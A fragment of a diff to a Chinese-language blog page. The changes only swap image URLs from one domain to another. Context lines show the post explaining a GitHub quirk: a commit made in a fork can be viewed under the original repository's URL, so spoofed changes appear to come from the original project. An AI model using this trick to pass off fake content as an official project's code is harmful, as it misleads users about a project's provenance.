-	srcset=&#34;https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att1_hu6c646258d5fec85df35b72dcc0ac7b76_87923_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att1_hu6c646258d5fec85df35b72dcc0ac7b76_87923_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att1_hu6c646258d5fec85df35b72dcc0ac7b76_87923_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att1_hu6c646258d5fec85df35b72dcc0ac7b76_87923_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;啥？Linus大神居然说Linux糟糕至极，并删除Linux项目推荐我们用Win XP&#34;
@@ -3988,10 +3988,10 @@
 &lt;p&gt;首先Fork某一个项目，然后在你fork的项目中随便改点东西(任意的东西都可以)&lt;/p&gt;
 &lt;p&gt;&lt;del&gt;至于Fork键的位置，自己找&lt;/del&gt;&lt;/p&gt;
 &lt;p&gt;然后点进你新加上的commit&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att2.png&#34;
 	width=&#34;595&#34;
 	height=&#34;91&#34;
-	srcset=&#34;https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att2_huee27a286e853bc37957c8994abfce6a4_7560_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att2_huee27a286e853bc37957c8994abfce6a4_7560_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att2_huee27a286e853bc37957c8994abfce6a4_7560_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att2_huee27a286e853bc37957c8994abfce6a4_7560_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;commit位置&#34;
@@ -4019,10 +4019,10 @@
     &gt;https://github.com/NyDubh3/MEMZ/tree/43ab3c1283605216e5b56388c11483fee7dcd47c&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;这样你修改的东西就看来像是在原项目里一样 qaq&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att3.png&#34;
 	width=&#34;1878&#34;
 	height=&#34;583&#34;
-	srcset=&#34;https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att3_huc4979fc741d7d64bdc574d5727731e71_114701_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att3_huc4979fc741d7d64bdc574d5727731e71_114701_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att3_huc4979fc741d7d64bdc574d5727731e71_114701_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/github%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Elinus%E5%A4%A7%E7%A5%9E%E6%80%92%E5%88%A0linux/Att3_huc4979fc741d7d64bdc574d5727731e71_114701_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;原项目被&amp;#34;修改&amp;#34;啦= =&#34;
